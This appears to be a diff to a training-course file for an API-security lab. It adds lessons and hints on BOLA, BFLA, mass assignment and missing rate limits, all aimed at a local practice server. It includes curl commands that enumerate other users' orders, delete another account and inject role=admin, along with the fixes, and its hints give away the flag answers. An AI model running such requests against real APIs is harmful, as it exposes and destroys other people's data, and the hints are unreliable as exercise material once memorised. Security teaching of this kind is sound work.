@@ -4,18 +4,38 @@
   "tasks": {
     "1": {
       "title": "BOLA: other users' objects",
+      "body": "## The most common authorization bug in APIs\n\nAuthentication answers \"who are you?\" (valid token → alice, id=2).\n**Authorization** answers \"can you touch THIS?\" — and that is the one that fails.\n\n```bash\n# Who am I?\ncurl -s http://127.0.0.1:18101/api/me\n# {\"id\": 2, \"name\": \"alice\", \"role\": \"user\"}\n\n# Which orders exist? Enumerate IDs:\ncurl -s http://127.0.0.1:18101/api/users\n\n# ANOTHER user's order (user_id: 1 = admin):\ncurl -s http://127.0.0.1:18101/api/orders/1002\n# {\"id\": 1002, \"user_id\": 1, \"amount\": 999.99, ...,\n#  \"note\": \"BOLA: this order belongs to user 1 but you are user 2\"}\n```\n\nThe server looks the order up by ID and returns it. It never compares\n`order.user_id` with the token's `id`. Change `1002` to `1001` or `1003`\nand you walk through every order in the store: addresses, amounts,\nitems. In real APIs (banking, healthcare, government) this single bug\nleaks millions of records with a `for` loop over consecutive IDs.\n\n## Exploiting it with a script (like a real attacker)\n\n```bash\nfor id in 1001 1002 1003; do\n  curl -s \"http://127.0.0.1:18101/api/orders/$id\" | grep -E 'id|item'\ndone\n```\n\nThe classic web-app IDOR is exactly this under another name:\nBOLA is the API version of IDOR.\n\n## The fix\n\n```python\norder = orders.get(oid)\nif order['user_id'] != current_user['id']:   # ← the missing line\n    return error(404)  # 404 and not 403: don't reveal that it exists\n```\n\nEven better: queries that already filter by owner\n(`WHERE id = ? AND user_id = ?`) instead of fetching first and checking afterwards.",
       "questions": {
-        "api-security-t01-q01": { "prompt": "Which number of the OWASP API Top 10 does BOLA (Broken Object Level Authorization) hold?" },
-        "api-security-t01-q02": { "prompt": "You are alice (id=2). Retrieve order 1002, which belongs to another user. Submit the flag." },
-        "api-security-t01-q03": { "prompt": "What field should the server compare in /api/orders/{id} to close the hole?" }
+        "api-security-t01-q01": {
+          "prompt": "Which number of the OWASP API Top 10 does BOLA (Broken Object Level Authorization) hold?",
+          "hint": "API1"
+        },
+        "api-security-t01-q02": {
+          "prompt": "You are alice (id=2). Retrieve order 1002, which belongs to another user. Submit the flag.",
+          "hint": "curl http://127.0.0.1:18101/api/orders/1002 — the API doesn't check who owns the object"
+        },
+        "api-security-t01-q03": {
+          "prompt": "What field should the server compare in /api/orders/{id} to close the hole?",
+          "hint": "The order has user_id and you have id in /api/me — they have to be compared"
+        }
       }
     },
     "2": {
       "title": "BFLA, mass assignment and unlimited consumption",
+      "body": "## BFLA: admin functions within reach of a DELETE\n\nBOLA was \"seeing what you shouldn't\". **BFLA** (Broken Function Level\nAuthorization) is \"doing what you shouldn't\": the API exposes administrative\nfunctions and only checks that you are logged in, not your role.\n\n```bash\n# Alice (role: user) deletes bob:\ncurl -s -X DELETE http://127.0.0.1:18101/api/users/3\n# {\"status\": \"deleted\", \"user\": \"bob\", \"note\": \"BFLA: you should not be able to do this!\"}\n```\n\nThe classic symptoms in real APIs: admin endpoints mounted on the\nsame host as the user ones (`/api/admin/users` forgets the role\nmiddleware), HTTP method collisions (the DELETE reaches the same route as the public\nGET) and \"hiding\" the button in the frontend with no validation in the\nbackend.\n\n## Mass assignment: the field you gave away\n\nWhen the backend does `role = body.get('role', 'user')` — or worse, passes\nthe whole JSON to the model constructor — any field you send\nbecomes yours:\n\n```bash\ncurl -s -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"name\": \"mallory\", \"role\": \"admin\"}' \\\n  http://127.0.0.1:18101/api/orders/create\n# \"MASS ASSIGNMENT: you set role=admin!\"\n```\n\nThe most famous exploit in history was exactly this: in 2012, a\nresearcher added `\"admin\": true` to the JSON of his GitHub profile...\nand became an admin of the platform.\n\n**Fix**: an explicit allowlist of acceptable fields (`name`, `email`)\nand never map the body straight onto the model (in Django: `ModelForm` with\ndeclared fields, not `**request.POST`).\n\n## Unlimited resource consumption\n\n`/api/export` has no rate limit, no pagination and no special\nauthentication: a single GET downloads ALL users and ALL orders.\nAn attacker can bring your database down (and run up your bandwidth bill) with\na `while true`.\n\n```bash\ncurl -s http://127.0.0.1:18101/api/export | jq '.flag'\n```\n\nThe standard mitigations: rate limiting per IP and per token (429),\nmandatory pagination (`?page=1&limit=50`), response size\nlimits and per-user compute \"budgets\". In paid APIs,\nalso: quotas per API key.\n\n## How a real API is audited\n\n1. Enumerate the endpoints with the spec (Swagger/OpenAPI) or with Burp.\n2. For EACH endpoint ask yourself: someone else's object? (BOLA) a function of\n   another role? (BFLA) an extra field in the body? (mass assignment)\n   a usage limit? (resources).\n3. Always test as a LOW-role user: the admin sees everything and\n   masks the bugs.",
       "questions": {
-        "api-security-t02-q01": { "prompt": "Delete bob's account (id=3) while being alice. Submit the BFLA achievement flag." },
-        "api-security-t02-q02": { "prompt": "Create an account with role admin by abusing the API copying any JSON field. Submit the flag." },
-        "api-security-t02-q03": { "prompt": "The /api/export endpoint dumps the whole database with no rate limit or pagination. Submit the flag it gives away." }
+        "api-security-t02-q01": {
+          "prompt": "Delete bob's account (id=3) while being alice. Submit the BFLA achievement flag.",
+          "hint": "curl -X DELETE http://127.0.0.1:18101/api/users/3 — deleting users is an admin function, but the API doesn't check the role"
+        },
+        "api-security-t02-q02": {
+          "prompt": "Create an account with role admin by abusing the API copying any JSON field. Submit the flag.",
+          "hint": "curl -X POST -H 'Content-Type: application/json' -d '{\"name\":\"mallory\",\"role\":\"admin\"}' http://127.0.0.1:18101/api/orders/create"
+        },
+        "api-security-t02-q03": {
+          "prompt": "The /api/export endpoint dumps the whole database with no rate limit or pagination. Submit the flag it gives away.",
+          "hint": "curl http://127.0.0.1:18101/api/export | jq .flag"
+        }
       }
     }
   }
